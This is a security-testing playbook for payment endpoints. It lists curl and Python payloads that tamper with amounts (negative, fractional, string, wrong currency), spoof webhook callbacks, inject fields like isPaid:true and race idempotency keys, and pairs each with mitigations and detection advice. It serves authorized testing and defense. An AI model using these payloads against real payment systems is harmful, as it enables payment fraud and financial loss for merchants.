# Payment‑Amount 403 Bypass Techniques — Practical Playbook 

**Purpose:** practical, attack‑oriented checklist and playbook to test for payment‑amount tampering and 403 bypasses in payment endpoints. Designed for authorized testing / CTF / staging only. Focus on high‑value checks, clear PoCs, what to observe, and mitigations. Reproducible, minimal proofs are emphasized.

---

## Quick summary / threat model

**Goal:** cause the system to accept a payment request with an attacker‑controlled/incorrect `amount` (or treat it as valid) or to create inconsistency that results in incorrect authorization/state (refunds, credit, order fulfillment) — especially where a 403 is expected but can be bypassed.

**Attacker capabilities:** send HTTP requests to payment endpoints (checkout, webhook/callback endpoints), replay or manipulate callbacks, control idempotency keys or request ordering, control some input fields (`productId`, `currency`, `amount`).

**Assumptions:** server-side logic may perform client‑trusting calculations, do rounding/coercion, use multiple parsing layers, or accept callbacks without strict verification.

---

## Tools & testbed

- Burp Suite (Repeater / Intruder), curl, wfuzz/ffuf, Postman.
- Python (`requests`), Node scripts for concurrency (optional).
- Payment sandbox / staging accounts — **never** test real financial endpoints without permission.
- Logging capture: raw request/response, timestamps, server response body/headers, webhook logs, payment provider dashboard logs.

---

## Testing methodology (practical)

1. **Baseline:** record a normal successful payment (correct amount) and a rejected request (403/4xx). Capture exact request and response, including headers. Note server‑side calculated totals if visible.
2. **Single‑variable changes:** change one field at a time (amount type, format, encoding, currency, productId).
3. **Layered/combined tests:** combine encoding + duplicate params + content type + idempotency to find race or parser disagreements.
4. **Observe differences:** HTTP code, response body, Content‑Length, headers (Location, Set‑Cookie), logs in provider dashboard, created orders/transactions.
5. **Reproduce minimal PoC:** once you get a positive, reduce payload to the minimal vector that reproduces it.
6. **Document & mitigate:** produce clear steps for devs to reproduce and fix.

---

## Attack classes, payloads, observables, and mitigations

### 1) Simple tampering (baseline)
- **What:** submit requests where `amount` is changed from expected value.
- **Payloads (curl):**
```bash
curl -X POST -H "Content-Type: application/json" -d '{"amount": 403, "productId":123}' https://example.com/pay
curl -X POST -H "Content-Type: application/json" -d '{"amount": 1000, "productId":123}' https://example.com/pay
```
- **What to observe:** server rejects, recalculates, or accepts. Status codes to note: `200/201` (accepted), `400` (bad request), `403` (forbidden), `500` (server error).
- **Why:** confirms whether server validates client‑supplied amount against server product price or order total.
- **Mitigation:** always server‑side compute final price from `productId` / price table; ignore client amount except for display.

---

### 2) Precision & rounding edge cases
- **What:** send decimal/fractional values to test rounding.
- **Payloads:**
```bash
curl -X POST -H "Content-Type: application/json" -d '{"amount": 403.0000001, "productId":123}' https://example.com/pay
curl -X POST -H "Content-Type: application/json" -d '{"amount": 402.9999999, "productId":123}' https://example.com/pay
```
- **Observe:** server rounding/truncation leading to acceptance when it should reject; inconsistent totals between client and server; off‑by‑one cent.
- **Why:** float handling or conversion to integer cents can allow small differences to be accepted.
- **Mitigation:** represent currency in integer minor units (cents) server‑side; never use floating point for money; validate amounts strictly.

---

### 3) Negative/void values & signs
- **What:** send negative, signed, or zero values.
- **Payloads:**
```bash
curl -X POST -H "Content-Type: application/json" -d '{"amount": -403, "productId":123}' https://example.com/pay
curl -X POST -H "Content-Type: application/json" -d '{"amount": +403, "productId":123}' https://example.com/pay
```
- **Observe:** server treats negative as void/credit, or attempts to process yielding refunds or state inconsistencies; server might coerce to absolute value.
- **Why:** some systems accept negative amounts (refunds) if not validated, leading to crediting attacker.
- **Mitigation:** reject negative amounts on payment endpoints; separate refund API with proper authorization.

---

### 4) Type confusion & alternate encodings
- **What:** change the type/format of `amount` or encode differently (string, scientific notation, padded zeros).
- **Payloads:**
```bash
curl -X POST -H "Content-Type: application/json" -d '{"amount": "403", "productId":123}' https://example.com/pay
curl -X POST -H "Content-Type: application/json" -d '{"amount": 4.03e2, "productId":123}' https://example.com/pay
curl -X POST -H "Content-Type: application/json" -d '{"amount": "00403", "productId":123}' https://example.com/pay
```
- **Observe:** server coerces types differently across layers (e.g., client‑side string vs server numeric parsing), sometimes accepting string and not normalizing.
- **Why:** type coercion bugs can cause bypass when validation only checks type or format.
- **Mitigation:** canonicalize type server‑side (parse string→int cents with strict validation), reject ambiguous types.

---

### 5) Currency mismatch & units confusion
- **What:** submit amounts in minor units vs major units, or mismatch `currency` field.
- **Payloads:**
```bash
curl -X POST -H "Content-Type: application/json" -d '{"amount": 403, "currency":"USD", "productId":123}' https://example.com/pay
curl -X POST -H "Content-Type: application/json" -d '{"amount": 40300, "currency":"cents", "productId":123}' https://example.com/pay
```
- **Observe:** server misinterprets currency units, leading to huge undervaluation/overvaluation; acceptance despite mismatch.
- **Why:** trusting client currency or unit leads to financial loss.
- **Mitigation:** compute/canonicalize units and currency entirely on server; require currency agreement with product pricing.

---

### 6) Price override by referencing productId mismatch
- **What:** keep amount low but change `productId` to a different product or reuse an orderId.
- **Payloads:**
```bash
curl -X POST -H "Content-Type: application/json" -d '{"amount": 1, "productId": 999}' https://example.com/pay
curl -X POST -H "Content-Type: application/json" -d '{"amount": 403, "productId": 456}' https://example.com/pay
```
- **Observe:** server accepts based on client amount rather than looking up product price; or server recalculates and rejects.
- **Why:** if server trusts client amount, attacker can pay less for expensive item.
- **Mitigation:** server must always compute price from `productId` and quantity.

---

### 7) Replay / callback manipulation (webhook spoofing)
- **What:** replay legitimate provider callbacks or send spoofed callbacks with modified `amount` or `status`.
- **Payloads:**
```bash
curl -X POST -H "Content-Type: application/json" -d '{"paymentId":"123","amount":100,"status":"SUCCESS"}' https://example.com/callback
curl -X POST -H "Content-Type: application/json" -d '{"paymentId":"123","amount":403,"status":"SUCCESS"}' https://example.com/callback
```
- **Observe:** server accepts callback without verifying signature, updates order as paid with tampered amount.
- **Why:** many systems trust webhook body without authenticating signature/timestamp.
- **Mitigation:** verify provider signatures (HMAC), timestamps, and reconcile with provider API (query provider for transaction details) before marking order paid.

---

### 8) Idempotency & race conditions
- **What:** send concurrent conflicting requests using same `idempotencyKey` or overlapping order creation and payment flows.
- **Payloads (concept):** Two concurrent `POST /pay` calls with same `idempotencyKey` — one with correct amount, one with altered amount.
- **Example:**
```bash
curl -X POST -H "Content-Type: application/json" -d '{"amount":403,"idempotencyKey":"key1","productId":123}' https://example.com/pay
curl -X POST -H "Content-Type: application/json" -d '{"amount":100,"idempotencyKey":"key1","productId":123}' https://example.com/pay
```
- **Observe:** race leads to inconsistent canonicalization of amount — the system might accept the lower amount due to ordering or race in DB transactions.
- **Why:** poor idempotency implementation or lack of transactional enforcement permits race manipulation.
- **Mitigation:** server must canonicalize on first request and ignore subsequent conflicting amounts for same `idempotencyKey`; use transactional locks and consistent canonical amount computation.

---

## Additional advanced checks (combine with above)
- **Duplicate param / parameter pollution:** send `amount` in both query and body, or both as JSON and form; check which value is used.
- **Content‑type parser differences:** send JSON vs `application/x-www-form-urlencoded` vs `multipart/form-data` — different parsers might be used.
- **Encoding tricks (percent, base64):** encode the amount or `productId` to see if downstream decoders alter interpretation.
- **Null/whitespace/hidden chars** in numeric fields to see if parsing drops suffix/prefix or truncates.
- **Mass assignment:** include extra fields like `isPaid:true`, `status:\"PAID\"` in body if server binds raw input to model.
- **Callback chaining:** exploit systems that accept callback + later reconciliation but lack provider verification.

---

## Observables checklist (what to capture)
- HTTP status and full body (for each test): `200/201` vs `4xx/5xx`.
- Response headers: `Location`, `Set-Cookie`, custom `X-` headers, rate-limit headers.
- Content‑Length changes and body diffs (use diff or Burp comparators).
- Provider dashboard entries (transaction amount, status).
- Server logs / webhook logs if accessible (timestamps, request IDs).
- Created DB records (order total, payment amount, invoice).
- Any tokens or receipts returned for attacker to exploit later.

---

## Reproducible PoC procedure (example)
1. **Baseline:** place order for `productId=123`; server expects $403; request recorded and rejected or accepted.
2. **Test simple tamper:** change `amount` to `1` and send; capture response.
3. **If server accepts,** check created order and payment records — screenshot DB/order page or API response.
4. **If server rejects but callback accepts:** replay a legitimate callback (sandbox) with lower amount; if accepted, you have callback weakness — capture full raw callback request/response.
5. **Reduce** to minimal payload that causes acceptance, document exact fields and sequence.

---

## Detection & logging recommendations (for defenders)
- Log the canonical source of `amount` (server computed vs client provided) and include in audit logs.
- Require and log webhook signature verification failures and accept only signed callbacks.
- Alert on mismatches between product price (server) and payment amount (client) for accepted orders.
- Monitor unusual patterns: rapid retries with same `idempotencyKey` but varying amounts, high variance in decimal precision, and negative amounts.
- Reconcile payment provider transactions with internal order amounts regularly.

---

## Concrete mitigations checklist (developer)
1. **Server-side authoritative pricing:** derive price from `productId & quantity` server‑side and ignore client amount for final charge calculation.
2. **Integer minor units:** use integer cents (or minor units) everywhere; never use floats for money.
3. **Canonicalization:** normalize incoming amount formats, decode encodings before checks, strip whitespace and control chars.
4. **Strict type validation:** require integer cents, reject strings/float/scientific unless explicitly parsed and validated.
5. **Currency enforcement:** server maps product currency; reject mismatched currency or unit fields.
6. **Webhook verification:** verify provider signatures, timestamps, and transaction IDs; perform provider API reconciliation if possible.
7. **Idempotency consistency:** bind `idempotencyKey` to canonical computed amount; subsequent requests with different amounts must be rejected or audited.
8. **Transaction atomicity:** use DB transactions and locks to avoid race conditions altering final amount.
9. **Reject negative amounts** on payment endpoints.
10. **Rate limiting & monitoring** on payment attempts and callback endpoints.

---

## Minimal automation templates

### Python (single tests)
```python
import requests
url = "https://example.com/pay"
tests = [
  {"amount":403,"productId":123},
  {"amount":1,"productId":123},
  {"amount":403.0000001,"productId":123},
  {"amount":"403","productId":123},
  {"amount":-403,"productId":123},
]

for p in tests:
    r = requests.post(url, json=p, timeout=8)
    print(p, r.status_code, r.text[:300])
```

### Python (race / idempotency sketch — staging only)
```python
import requests, threading
url = "https://example.com/pay"
def send(payload):
    r = requests.post(url, json=payload, timeout=8)
    print(payload, r.status_code)

p1 = {"amount":403,"idempotencyKey":"key1","productId":123}
p2 = {"amount":1,"idempotencyKey":"key1","productId":123}

t1 = threading.Thread(target=send, args=(p1,))
t2 = threading.Thread(target=send, args=(p2,))
t1.start(); t2.start()
t1.join(); t2.join()
```

Use only in staging and with safeguards (throttling).

---

## Final notes — pragmatic, no fluff
- The most fruitful finds are combinations: type confusion + duplicate params, webhook spoof + missing signature checks, or idempotency race + inconsistent canonical amount. Test those paths first.
- When you report, include: exact raw requests, server responses, provider transaction evidence, and the minimal repro. Developers need the shortest, repeatable PoC.
- Prioritize: server authoritative pricing > webhook verification > idempotency logic > data canonicalization.
